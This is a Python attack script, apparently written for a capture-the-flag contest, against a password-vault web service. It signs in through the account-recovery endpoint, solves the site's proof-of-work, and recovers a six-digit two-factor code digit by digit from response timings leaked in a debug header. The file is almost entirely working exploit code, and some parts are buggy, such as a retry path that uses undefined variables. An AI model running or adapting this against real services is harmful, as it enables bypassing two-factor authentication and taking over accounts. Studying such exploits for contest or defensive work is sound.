from requests import Session
from hashlib import sha256
from base64 import b64encode, b64decode
from re import findall
from string import digits, ascii_letters
from random import choice as rand_choice
from multiprocessing import Pool
from scipy.stats import zscore

from time import time

TIMEOUT = 10
TWOFA_LENGTH = 6

REGEX_2FA_PREFIX = r'<input type="text" name="prefix" value="(.*?)" hidden>'
REGEX_2FA_DIFF = r'<input type="text" name="difficulty" value="(.*?)" hidden>'
REGEX_2FA_TIMING = r'Password Check: (\d+)ns;'
REGEX_PASSWORD_PASSWORD = r'decrypt_id\("(.*)", ".*", "1_pwd"\)'
REGEX_QUESTION_QUESTION = r'decrypt_id\("(.*)", ".*", "show_question"\)'

PORT = 1984

key_errors = 0

# Returns logged in Session
def register_and_login(ip: str, username: str, password: str) -> Session:

	s = Session()
	creds = {
		"username" : username,
		"password" : password,  # login needs password
		"password1" : password, # register needs password1
	}
	resp = s.post(f"http://{ip}:{PORT}/users/signup/", data = creds, timeout = TIMEOUT)
	#print(username, password)
	#print(resp.text)
	resp = s.post(f"http://{ip}:{PORT}/users/login/" , data = creds, timeout = TIMEOUT)
	
	return s


# Login as user through recovery functionality
def login_recovery(ip: str, username: str, recovery_answer: str) -> Session:
    s = Session()
    recovery_data = {
        "username": username,
        "num": "1",
        "answer": encrypt(recovery_answer, username)
    }
    s.post(f"http://{ip}:{PORT}/users/recover/", data = recovery_data)
    
    return s


def encrypt(plaintext: str, password: str) -> str:
	res = b""
	for i in range(len(plaintext)):
		xor = ord(password[i % len(password)]) ^ ord(plaintext[i])
		res += xor.to_bytes(1, "big")

	return b64encode(res)


def decrypt(data: str, password: str) -> str:
	data = b64decode(data)
	res = ""
	for i in range(len(data)):
		xor = ord(password[i % len(password)]) ^ data[i]
		res += chr(xor)

	return res


def is_valid_pow(digest: str, difficulty: int) -> bool:
	bits = "".join(bin(i)[2:].zfill(8) for i in digest)
	return bits[:difficulty] == "0" * difficulty


def compute_pow(prefix: str, difficulty: int) -> str:
	i = 0
	while True:
		i += 1
		s = prefix + str(i)
		if is_valid_pow(sha256(s.encode()).digest(), difficulty):
			return str(i)


def test_2fa(s: Session, ip: str, code: str):
	resp = s.get(f"http://{ip}:{PORT}/vault/", timeout = TIMEOUT)
	if "Your new 2FA code is" in resp.text:
		print(resp.text)
	prefix = findall(REGEX_2FA_PREFIX,  resp.text)[0]
	difficulty = int(findall(REGEX_2FA_DIFF,  resp.text)[0])

	pow_data = {
		"2fa_code": code,
		"pow": compute_pow(prefix, difficulty),
	}

	resp = s.post(f"http://{ip}:{PORT}/vault/", data = pow_data, timeout = TIMEOUT)
	return resp


def digit_best_timing(timings):
	zscores = list(zscore(timings))
	[print(i, t, z) for i,t,z in zip(range(10), timings, zscores)]
	
	max_zscore = max(zscores)
	if max_zscore > 1.8 or len([z for z in zscores if z > 1.5]) == 1:
		return str(zscores.index(max_zscore))

	print("Too vague")
	return None


def try_digit(session: Session, target: str, code: str) -> float:

	resp = test_2fa(session, target, code)
	if "vault/passwords" in resp.url:
		return 99999999999 # correct code
	
	try:
		timing = int(findall(REGEX_2FA_TIMING, resp.headers["DebugStats"])[0])
	except KeyError as e:
		print("No Header DebugStats")
		if key_errors < 5:
			key_errors += 1
			return try_digit(session, target, leaked, c)
		else:
			raise e

	#print("Tried", code, timing)
	return timing


def crack_code(target: str, username: str, recovery_answer: str) -> str:
	
	start = time()
	leaked = ""
	sessions = []
	tries = [0] * TWOFA_LENGTH
	with Pool(10) as p:
		sessions = p.starmap(login_recovery, [(target, username, recovery_answer)]*10)

		while len(leaked) != TWOFA_LENGTH:#for i in range(TWOFA_LENGTH):
			timings = []
			#, initializer=set_global_session, initargs=(target, username, recovery_answer)
			timings = p.starmap(try_digit, [(sessions[i], target, (leaked + digits[i]).ljust(6, "0")) for i in range(10)])
			
			tries[len(leaked)] += 1
			print(tries, time()-start)

			leaked_digit = digit_best_timing(timings)
			if leaked_digit:
				leaked += leaked_digit

			if time() - start > 45:
				raise Exception(f"Took to long, leaked {leaked}, tries: {tries}")
			
			print("Leaked", leaked)
	
	return sessions[int(leaked[-1])] # Return session with correct code entered

def random_string():
	return "".join(rand_choice(ascii_letters + digits) for _ in range(15))



# ip = "127.0.0.1"
# ip = "172.19.0.2"
# flag_id = "test2"

# s = register_and_login(ip, flag_id, flag_id)

# code = crack_code(s, ip, flag_id, "It's useless")

# print("Code is", code)